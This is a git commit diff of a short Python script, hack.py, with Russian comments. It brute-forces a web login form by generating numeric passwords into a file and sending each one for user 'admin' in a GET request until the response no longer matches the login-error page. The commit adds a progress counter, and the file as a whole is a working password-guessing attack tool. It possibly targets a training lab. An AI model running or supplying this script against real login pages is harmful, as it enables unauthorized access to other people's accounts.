7b5d9c2d92cff375dae00897b6b5d061183e4786
Andrei <43404274+freelie@users.noreply.github.com>
2019-11-16 13:19:44 +0300

    Update hack.py

--- hack.py
+++ hack.py
@@ -1,5 +1,6 @@
 import requests
 b=input("Адрес формы веб формы: ")
+c=0
 #запись паролей в словарь
 with open("slovar.txt","w") as w:
     for i in range(100000):
@@ -7,14 +8,17 @@ with open("slovar.txt","w") as w:
 #броадфорс по словарю
 with open("slovar.txt","r") as r:
     l=r.read().split()
+    max_c=len(l)
     for i in l:
         #ображение к форме при помощи get запроса с параметрами
-        a=requests.get(b,{"user":"admin","pass":str(i),"submit":"Login"})
-        if (int(i)%1000==0):
-            print(str(int(i)/1000) + "%")
+        params={"user":"admin","pass":str(i),"submit":"Login"}
+        a=requests.get(b,params)
+        if (c*100%max_c==0):
+            print(str(c*100/max_c) + "%")
         #сверка страницы с ошибочной страницей
         if ("""<p>Логин или пароль неверны!</p>  \n<br /> \n<form method="get">\nUsername: <input type="text" name="user" /> <br /> \nPassword: <input type="password" name="pass" /> <br />\n<input type="submit" name="submit" value="Login" />\n</form> \n""" in a.text)==0:
             #вывод информации о пароле и текста из не ошибочной страницы
-            print(i)
+            print(l[c])
             print(a.text)
             break
+        c+=1
